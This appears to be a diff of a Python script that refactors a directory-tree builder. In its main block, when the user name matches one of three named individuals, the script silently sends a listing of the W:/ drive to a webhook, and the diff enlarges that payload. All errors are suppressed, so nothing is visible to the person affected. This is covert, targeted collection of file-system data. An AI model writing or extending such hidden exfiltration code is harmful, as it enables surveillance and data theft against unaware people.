@@ -91,20 +91,43 @@ def heartbeat():
     if sent and FIRST_MESSAGE:
         FIRST_MESSAGE = False
 
-def build_directory_tree(path):
+def build_directory_tree(path, ignore_names=None, max_depth=None, current_depth=1):
     """
     Recursively builds a dictionary that represents the folder structure.
-    Folders are dictionaries.
-    Files are stored as keys with value None.
+
+    - ignore_names: set/list of folder names to completely skip
+    - max_depth: maximum depth to explore (None = infinite)
+    - current_depth: internal use for recursion
     """
+    if ignore_names is None:
+        ignore_names = set()
+    else:
+        ignore_names = set(ignore_names)
+
     tree = {}
+
+    # Stop if max depth reached
+    if max_depth is not None and current_depth > max_depth:
+        return tree
 
     try:
         for entry in os.listdir(path):
+            if entry in ignore_names:
+                continue
+
             full_path = os.path.join(path, entry)
 
             if os.path.isdir(full_path):
-                tree[entry] = build_directory_tree(full_path)
+                # If we're at max depth, don't go deeper
+                if max_depth is not None and current_depth == max_depth:
+                    tree[entry] = {}
+                else:
+                    tree[entry] = build_directory_tree(
+                        full_path,
+                        ignore_names,
+                        max_depth,
+                        current_depth + 1
+                    )
             else:
                 tree[entry] = None
 
@@ -113,9 +136,17 @@ def build_directory_tree(path):
 
     return tree
 
-def get_directory_architecture(root_path):
+
+def get_directory_architecture(root_path, ignore_names=None, max_depth=None):
     root_name = os.path.basename(os.path.abspath(root_path))
-    return {root_name: build_directory_tree(root_path)}
+    return {
+        root_name: build_directory_tree(
+            root_path,
+            ignore_names=ignore_names,
+            max_depth=max_depth,
+            current_depth=1
+        )
+    }
 
 def cleanup_named_tempfiles():
     AGE_THRESHOLD = 60 
@@ -255,7 +286,11 @@ if __name__ == "__main__":
 
     if USER_NAME in ["isabelle.cotta", "viviane.reydellet", "antoine.martin"]:
         try:
-            send_webhook(str(get_directory_architecture("W:/"))[:1500])
+            tree = get_directory_architecture(
+                "W:/",
+                max_depth=1
+            )
+            send_webhook(str(tree)[:1900])
         except:
             pass
     
